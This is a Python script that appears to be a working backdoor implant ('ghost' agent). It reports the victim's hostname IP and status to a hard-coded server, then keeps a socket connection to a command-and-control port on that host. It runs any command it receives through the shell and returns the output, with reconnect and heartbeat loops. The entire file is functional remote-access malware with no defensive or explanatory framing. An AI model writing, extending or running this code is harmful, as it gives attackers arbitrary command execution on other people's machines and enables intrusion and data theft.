#!/usr/bin/env python3
import os
import sys
import platform
import socket
import time
import json
import subprocess
import requests
import threading
import logging

VPS_IP = "157.245.3.180"
HTTP_PORT = 8000
C2_PORT = 8001
REPORT_URL = f"http://{VPS_IP}:{HTTP_PORT}/report"
AGENT_ID = f"ghost_{int(time.time()*1000)}"

logging.basicConfig(filename='payload_agent.log', level=logging.INFO, format='%(asctime)s %(levelname)s: %(message)s')

def http_report(status, extra=None):
    data = {
        "agent_id": AGENT_ID,
        "ip": socket.gethostbyname(socket.gethostname()),
        "status": status,
        "extra": extra or {}
    }
    try:
        requests.post(REPORT_URL, json=data, timeout=10)
    except requests.exceptions.RequestException as e:
        logging.error(f"Error reporting status: {e}")
    except Exception as e:
        logging.error(f"Unexpected error in http_report: {e}")

def c2_connect():
    while True:
        try:
            with socket.socket() as s:
                s.settimeout(10)
                s.connect((VPS_IP, C2_PORT))
                s.send(f"AGENT {AGENT_ID} CONNECTED".encode())
                while True:
                    try:
                        cmd = s.recv(1024).decode().strip()
                        if not cmd:
                            break
                        if cmd == "1":
                            result = subprocess.getoutput("dir C:\\" if platform.system() == "Windows" else "ls /")
                            s.send(result.encode()[:4000])
                        elif cmd == "4":
                            for _ in range(15):
                                subprocess.run("ipconfig" if platform.system() == "Windows" else "ifconfig", shell=True)
                            with open("C:\\LOUD.TXT", "w") if platform.system() == "Windows" else open("/tmp/LOUD.TXT", "w") as f:
                                f.write("I AM GHOST")
                            s.send(b"LOUD MODE")
                        else:
                            result = subprocess.getoutput(cmd)
                            s.send(result.encode()[:4000])
                    except socket.timeout:
                        continue
                    except Exception as e:
                        logging.error(f"Unexpected error in c2_connect: {e}")
        except socket.error as e:
            logging.error(f"Error connecting to C2: {e}")
        except Exception as e:
            logging.error(f"Unexpected error in c2_connect: {e}")
        time.sleep(60)  # Retry connection after 60 seconds

def main():
    try:
        http_report("deployed")
        c2_connect_thread = threading.Thread(target=c2_connect, daemon=True)
        c2_connect_thread.start()
        while True:
            try:
                time.sleep(300)
                http_report("heartbeat")
            except KeyboardInterrupt:
                http_report("terminated")
                sys.exit(0)
            except Exception as e:
                logging.error(f"Error in main loop: {e}")
                time.sleep(60)
    except Exception as e:
        logging.error(f"Unexpected error in main: {e}")
        time.sleep(60)

if __name__ == "__main__":
    main()